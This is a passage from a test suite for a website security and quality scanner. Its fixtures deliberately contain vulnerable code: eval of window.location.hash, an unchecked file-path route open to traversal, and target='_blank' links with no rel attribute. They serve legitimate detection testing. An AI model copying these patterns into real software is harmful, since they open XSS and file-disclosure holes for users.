    "src/api/transcripts.ts": [
      "import fs from 'node:fs';",
      "import path from 'node:path';",
      "import sanitizeHtml from 'sanitize-html';",
      "const TRANSCRIPTS_DIR = path.resolve(process.cwd(), 'transcripts');",
      "const options = {",
      "  allowedAttributes: { a: ['href', 'target', 'rel'] },",
      "  transformTags: { a: sanitizeHtml.simpleTransform('a', { target: '_blank', rel: 'noopener noreferrer' }) },",
      "};",
      "function sanitizeTranscriptHtml(content) { return sanitizeHtml(content, options); }",
      "export function register(fastify) {",
      "  fastify.get('/transcripts/:fileName', (request, reply) => {",
      "    const { fileName } = request.params;",
      "    const filePath = path.resolve(TRANSCRIPTS_DIR, fileName);",
      "    let content = fs.readFileSync(filePath, 'utf8');",
      "    content = sanitizeTranscriptHtml(content);",
      "    return reply.type('text/html').send(content);",
      "  });",
      "}",
    ].join("\n"),
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  const openerFindings = result.findings.filter(({ id }) => id === "security-external-link-opener");
  assert.deepEqual(openerFindings.map(({ file }) => file), ["src/services/transcript.ts"]);
});

test("website scan requires a real transformTags.a contract with rel allowlisted", async (t) => {
  const cases = [
    {
      name: "transform outside transformTags",
      options: [
        "  allowedAttributes: { a: ['href', 'target', 'rel'] },",
        "  metadata: { a: sanitizeHtml.simpleTransform('a', { target: '_blank', rel: 'noopener noreferrer' }) },",
      ],
    },
    {
      name: "rel omitted from allowed attributes",
      options: [
        "  allowedAttributes: { a: ['href', 'target'] },",
        "  transformTags: { a: sanitizeHtml.simpleTransform('a', { target: '_blank', rel: 'noopener noreferrer' }) },",
      ],
    },
  ];

  for (const sample of cases) {
    await t.test(sample.name, async (subtest) => {
      const project = await fixture(subtest, {
        "package.json": { private: true, dependencies: { react: "latest" } },
        "index.html": "<!doctype html><html lang=\"en\"><head><title>App</title></head><body><main>App</main></body></html>",
        "src/services/transcript.ts": [
          "import fs from 'node:fs';",
          "import path from 'node:path';",
          "const TRANSCRIPT_DIR = path.join(process.cwd(), 'transcripts');",
          "export async function createTranscript(id, attachment, apiBase) {",
          "  let html = `<a href=\"${attachment.url}\" target=\"_blank\">file</a>`;",
          "  const fileName = `transcript-${id}-${Date.now()}.html`;",
          "  const filePath = path.join(TRANSCRIPT_DIR, fileName);",
          "  await fs.promises.writeFile(filePath, html);",
          "  const url = `${apiBase}/api/transcripts/${fileName}`;",
          "  return { url, fileName };",
          "}",
        ].join("\n"),
        "src/api/transcripts.ts": [
          "import fs from 'node:fs';",
          "import path from 'node:path';",
          "import sanitizeHtml from 'sanitize-html';",
          "const TRANSCRIPTS_DIR = path.resolve(process.cwd(), 'transcripts');",
          "const options = {",
          ...sample.options,
          "};",
          "function sanitizeTranscriptHtml(content) { return sanitizeHtml(content, options); }",
          "export function register(fastify) {",
          "  fastify.get('/transcripts/:fileName', (request, reply) => {",
          "    const { fileName } = request.params;",
          "    const filePath = path.resolve(TRANSCRIPTS_DIR, fileName);",
          "    let content = fs.readFileSync(filePath, 'utf8');",
          "    content = sanitizeTranscriptHtml(content);",
          "    return reply.type('text/html').send(content);",
          "  });",
          "}",
        ].join("\n"),
      });
      const result = await runSiteScan({
        ...project,
        options: { webDetection: project.webDetection },
      });
      const openerFindings = result.findings.filter(({ id }) => id === "security-external-link-opener");
      assert.deepEqual(openerFindings.map(({ file }) => file), ["src/services/transcript.ts"]);
    });
  }
});

test("website scan retains 45 label findings by default and suggests real monorepo site entries", async (t) => {
  const controls = Array.from({ length: 45 }, (_, index) =>
    `<input id=\"setting-${index}\" type=\"number\" value={${index}} />`).join("\n");
  const project = await fixture(t, {
    "package.json": { private: true, workspaces: ["dataminer", "web"] },
    "dataminer/package.json": { private: true, scripts: { start: "node src/index.js" } },
    "dataminer/src/index.js": "export const start = () => true;",
    "web/package.json": {
      private: true,
      dependencies: { react: "latest", "react-dom": "latest" },
      devDependencies: { vite: "latest" },
    },
    "web/index.html": "<!doctype html><html lang=\"en\"><head><title>App</title></head><body><div id=\"root\"></div><script type=\"module\" src=\"/src/App.tsx\"></script></body></html>",
    "web/src/App.tsx": `export function App() { return <main><h1>App</h1>${controls}</main>; }`,
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  assert.equal(result.findings.filter(({ id }) => id === "a11y-form-label").length, 45);
  assert.equal(result.metadata.options.maxFindingsPerRule, 50);
  assert.equal(result.metadata.suppressedByRule["a11y-form-label"], undefined);
  const review = result.findings.find(({ id }) => id === "manual-visual-ux-review");
  assert.deepEqual(review.suggestedFiles.slice(0, 2), ["web/index.html", "web/src/App.tsx"]);
  assert.ok(review.suggestedFiles.every((suggestion) =>
    project.files.some(({ relative }) => relative === suggestion)));
});

test("website per-rule caps retain deterministic locations regardless of descriptor order", async (t) => {
  const project = await fixture(t, {
    "package.json": { private: true, dependencies: { react: "latest" } },
    "index.html": "<!doctype html><html lang=\"en\"><head><title>App</title></head><body><main>App</main></body></html>",
    "src/routes/zeta.tsx": "export const Zeta = () => <img src=\"/zeta.png\" alt=\"Zeta\" />;",
    "src/routes/alpha.tsx": "export const Alpha = () => <img src=\"/alpha.png\" alt=\"Alpha\" />;",
    "src/routes/middle.tsx": "export const Middle = () => <img src=\"/middle.png\" alt=\"Middle\" />;",
  });
  const scanWith = (files) => runSiteScan({
    ...project,
    files,
    options: { webDetection: project.webDetection, maxFindingsPerRule: 2 },
  });
  const [forward, reversed] = await Promise.all([
    scanWith(project.files),
    scanWith([...project.files].reverse()),
  ]);
  const retained = (result) => result.findings
    .filter(({ id }) => id === "performance-image-dimensions")
    .map(({ file }) => file);

  assert.deepEqual(retained(forward), ["src/routes/alpha.tsx", "src/routes/middle.tsx"]);
  assert.deepEqual(retained(reversed), retained(forward));
  assert.equal(forward.metadata.suppressedByRule["performance-image-dimensions"], 1);
  assert.equal(reversed.metadata.suppressedByRule["performance-image-dimensions"], 1);
});

test("scanner results are deterministic when caller-supplied descriptors are reordered", async (t) => {
  const project = await fixture(t, {
    "package.json": { private: true, dependencies: { react: "latest" } },
    "about.html": "<!doctype html><html lang=\"en\"><head><title>About</title></head><body><main><h1>About</h1></main></body></html>",
    "index.html": "<!doctype html><html lang=\"en\"><head><title>Home</title></head><body><main><h1>Home</h1></main></body></html>",
    ".env.production": "PUBLIC_LABEL=production\n",
    ".env.local": "PUBLIC_LABEL=local\n",
  });
  const scanPair = (runner, options) => Promise.all([
    runner({ ...project, options }),
    runner({ ...project, files: [...project.files].reverse(), options }),
  ]);
  const stableResult = ({ generatedAt, durationMs, ...result }) => result;

  const [siteForward, siteReversed] = await scanPair(runSiteScan, { webDetection: project.webDetection });
  const [securityForward, securityReversed] = await scanPair(runSecurityScan, {
    webDetection: project.webDetection,
    auditDependencies: false,
  });

  assert.deepEqual(stableResult(siteReversed), stableResult(siteForward));
  assert.deepEqual(stableResult(securityReversed), stableResult(securityForward));
});

test("both scanner APIs reject a non-website repository", async (t) => {
  const project = await fixture(t, {
    "package.json": { bin: { helper: "bin/helper.js" } },
    "bin/helper.js": "#!/usr/bin/env node\nconsole.log('hello');",
  });
  assert.equal(project.webDetection.isWebsite, false);

  await assert.rejects(
    runSiteScan({ ...project, options: { webDetection: project.webDetection } }),
    (error) => error?.code === "NOT_A_WEBSITE",
  );
  await assert.rejects(
    runSecurityScan({ ...project, options: { webDetection: project.webDetection, auditDependencies: false } }),
    (error) => error?.code === "NOT_A_WEBSITE",
  );

  const forgedDetection = { isWebsite: true, confidence: "high", reasons: ["caller override"], signals: [] };
  await assert.rejects(
    runSiteScan({ ...project, options: { webDetection: forgedDetection } }),
    (error) => error?.code === "NOT_A_WEBSITE",
  );
  await assert.rejects(
    runSecurityScan({ ...project, options: { webDetection: forgedDetection, auditDependencies: false } }),
    (error) => error?.code === "NOT_A_WEBSITE",
  );
});

test("scanner APIs do not read caller-supplied descriptors outside the repository root", async (t) => {
  const project = await fixture(t, {
    "package.json": { private: true, dependencies: { react: "latest" } },
    "index.html": "<!doctype html><html lang=\"en\"><head><title>App</title></head><body><main>App</main></body></html>",
  });
  const outside = await fs.mkdtemp(path.join(os.tmpdir(), "modular-outside-descriptor-"));
  t.after(() => fs.rm(outside, { recursive: true, force: true }));
  const absolute = path.join(outside, "Injected.tsx");
  const secret = "outside-repository-secret-material";
  const source = [
    `export const clientSecret = '${secret}';`,
    "export const Injected = ({ url }) => <a href={url} target=\"_blank\">outside</a>;",
  ].join("\n");
  await fs.writeFile(absolute, source);
  const forced = {
    absolute,
    relative: "src/Injected.tsx",
    name: "Injected.tsx",
    extension: ".tsx",
    size: Buffer.byteLength(source),
    maxFileBytes: 1_500_000,
  };
  const files = [...project.files, forced];

  const security = await runSecurityScan({
    ...project,
    files,
    options: { webDetection: project.webDetection, auditDependencies: false },
  });
  const site = await runSiteScan({
    ...project,
    files,
    options: { webDetection: project.webDetection },
  });

  assert.ok(security.findings.every(({ file }) => file !== forced.relative));
  assert.ok(site.findings.every(({ file }) => file !== forced.relative));
  assert.doesNotMatch(JSON.stringify(security), new RegExp(secret));
  assert.ok(security.metadata.unreadableFiles >= 1);
  assert.ok(site.metadata.scope.unreadableFiles >= 1);
});

test("scanner APIs refuse a caller-supplied source symlink", async (t) => {
  const project = await fixture(t, {
    "package.json": { private: true, dependencies: { react: "latest" } },
    "index.html": "<!doctype html><html lang=\"en\"><head><title>App</title></head><body><main>App</main></body></html>",
  });
  const target = path.join(project.root, "outside-target.tsx");
  const link = path.join(project.root, "src", "Linked.tsx");
  await fs.writeFile(target, "export const Linked = ({ url }) => <a href={url} target=\"_blank\">linked</a>;");
  await fs.mkdir(path.dirname(link), { recursive: true });
  try {
    await fs.symlink(target, link, "file");
  } catch (error) {
    if (["EPERM", "EACCES", "ENOTSUP"].includes(error?.code)) {
      t.skip(`file symlinks are not available: ${error.code}`);
      return;
    }
    throw error;
  }
  const stat = await fs.stat(link);
  const forced = {
    absolute: link,
    relative: "src/Linked.tsx",
    name: "Linked.tsx",
    extension: ".tsx",
    size: stat.size,
    maxFileBytes: 1_500_000,
  };
  const files = [...project.files, forced];

  const security = await runSecurityScan({
    ...project,
    files,
    options: { webDetection: project.webDetection, auditDependencies: false },
  });
  const site = await runSiteScan({
    ...project,
    files,
    options: { webDetection: project.webDetection },
  });
  assert.ok(security.findings.every(({ file }) => file !== forced.relative));
  assert.ok(site.findings.every(({ file }) => file !== forced.relative));
});

test("modern .mts and .cts modules are included in both scan surfaces", async (t) => {
  const project = await fixture(t, {
    "package.json": { private: true, scripts: { dev: "vite" }, devDependencies: { vite: "latest" } },
    "index.html": "<!doctype html><html lang=\"en\"><head><title>App</title><meta charset=\"utf-8\"><meta name=\"viewport\" content=\"width=device-width\"></head><body><main id=\"root\"></main><script type=\"module\" src=\"/src/main.mts\"></script></body></html>",
    "src/main.mts": "const source: string = window.location.hash; eval(source);",
    "src/metadata.cts": "export const metadata = { title: 'App', description: 'Useful description' };",
  });
  const siteProgress = [];
  const security = await runSecurityScan({
    ...project,
    options: { webDetection: project.webDetection, auditDependencies: false },
  });
  const site = await runSiteScan({
    ...project,
    onProgress: (state) => siteProgress.push(state),
    options: { webDetection: project.webDetection },
  });

  assert.ok(security.findings.some((finding) => finding.id === "security.dynamic-code" && finding.file === "src/main.mts"));
  assert.ok(siteProgress.some((state) => state.file === "src/main.mts"));
  assert.ok(siteProgress.some((state) => state.file === "src/metadata.cts"));
  assert.ok(site.filesScanned >= 4);
});
